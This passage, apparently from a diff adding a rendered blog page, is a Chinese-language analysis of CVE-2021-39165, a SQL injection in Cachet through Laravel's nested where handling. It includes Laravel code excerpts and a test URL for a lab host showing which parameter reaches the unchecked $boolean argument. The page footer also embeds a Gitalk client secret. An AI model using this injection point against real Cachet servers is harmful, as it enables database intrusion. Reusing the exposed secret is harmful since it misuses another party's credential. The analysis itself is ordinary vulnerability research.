+</span></span></span><span class=line><span class=cl><span class=sd> * Add a nested where statement to the query.
+</span></span></span><span class=line><span class=cl><span class=sd> *
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  \Closure $callback
+</span></span></span><span class=line><span class=cl><span class=sd> * @param  string   $boolean
+</span></span></span><span class=line><span class=cl><span class=sd> * @return \Illuminate\Database\Query\Builder|static
+</span></span></span><span class=line><span class=cl><span class=sd> */</span>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>whereNested</span><span class=p>(</span><span class=nx>Closure</span> <span class=nv>$callback</span><span class=p>,</span> <span class=nv>$boolean</span> <span class=o>=</span> <span class=s1>&#39;and&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$query</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>forNestedWhere</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$callback</span><span class=p>,</span> <span class=nv>$query</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addNestedWhereQuery</span><span class=p>(</span><span class=nv>$query</span><span class=p>,</span> <span class=nv>$boolean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以观察到，这里遍历了用户输入的第一个数组参数<code>$column</code>，当发现其键名是一个数字，且键值是一个数组时，将会调用<code>[$query, $method]</code>，也就是<code>$this->where()</code>，并将完整的<code>$value</code>数组作为参数列表传入。</p><p>通过这个方法，就可以做到了一件事情：从控制<code>where()</code>的第一个参数，到能够完整控制<code>where()</code>的所有参数。</p><p>再看<code>where()</code>函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>where</span><span class=p>(</span><span class=nv>$column</span><span class=p>,</span> <span class=nv>$operator</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$value</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$boolean</span> <span class=o>=</span> <span class=s1>&#39;and&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>通过访问如下url进行测试：<code>http://192.168.121.131:10000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=xxx</code>，debug到where函数时，可以看到我们的xxx替换了<code>$boolean</code>,并且最终的报错并没有对<code>$boolean</code>做任何校验：</p><p><img src=/images/cachet/sql.png alt=sql></p><p>所以<code>1[3]</code>参数可以注入任何语句，所以这里存在一个SQL注入漏洞。</p><h2 id=总结>总结</h2><p>这个注入点的发现过程挺有意思的，具体过程可以看P师傅的文章。也让自己思考在各种框架以及ORM完善的情况，如何挖掘类似的漏洞？自己总结</p><ul><li>多关注对权限宽松的API</li><li>关注框架提供的自定义功能,开发者的疏忽产生漏洞的点</li></ul><h2 id=相关链接>相关链接</h2><ul><li><a href=https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html>https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html</a></li><li><a href=https://docs.cachethq.io/docs/installing-cachet>https://docs.cachethq.io/docs/installing-cachet</a></li></ul></div><div class=post-copyright><p class=copyright-item><span class=item-title>Author</span>
+<span class=item-content>fan-tastic.fun</span></p><p class=copyright-item><span class=item-title>LastMod</span>
+<span class=item-content>2023-05-09
+<a href=#ZgotmplZ/commit/e8704c8f3ff1d941345c2e0ace67aff215e74eb8 title="feat: 🎸 add cachet sql injection">(e8704c8)</a></span></p><p class=copyright-item><span class=item-title>License</span>
+<span class=item-content><a rel="license noopener" href=https://creativecommons.org/licenses/by/4.0/ target=_blank>知识共享署名4.0</a></span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/web%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>web漏洞分析</a>
+<a href=/tags/sql%E6%B3%A8%E5%85%A5/>SQL注入</a></div><nav class=post-nav><a class=next href=/post/basic_of_rust_concurrency/><span class="next-text nav-default">《Rust Atomics and Locks Low-Level 》阅读笔记1</span>
+<span class="next-text nav-mobile">Next</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=gitalk-container></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js crossorigin=anonymous></script>
+<script type=text/javascript>var gitalk=new Gitalk({id:"2023-05-08 23:24:02 \u002b0800 \u002b0800",title:"CVE-2021-39165 Cachet SQL注入分析",clientID:"8e56c7d6ce34f788ca8f",clientSecret:"d8012ab38028c2fffa457e0449f958da07dc84e5",repo:"fan-tastic.fun",owner:"peanut-cc",admin:["peanut-cc"],body:decodeURI(location.href)});gitalk.render("gitalk-container")</script><noscript>Please enable JavaScript to view the <a href=https://github.com/gitalk/gitalk>comments powered by gitalk.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/peanut-cc class="iconfont icon-github" title=github></a>
+<a href=https://www.fan-tastic.fun/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
+<span class=division>|</span>
+<span class=theme-info>Theme -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
+2022 -
+2023<span class=heart><i class="iconfont icon-heart"></i></span><span>by fan-tastic.fun</span>
+<span><a class=theme-link href=https://beian.miit.gov.cn/>豫ICP备2022023372号-1</a></span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script></body></html>
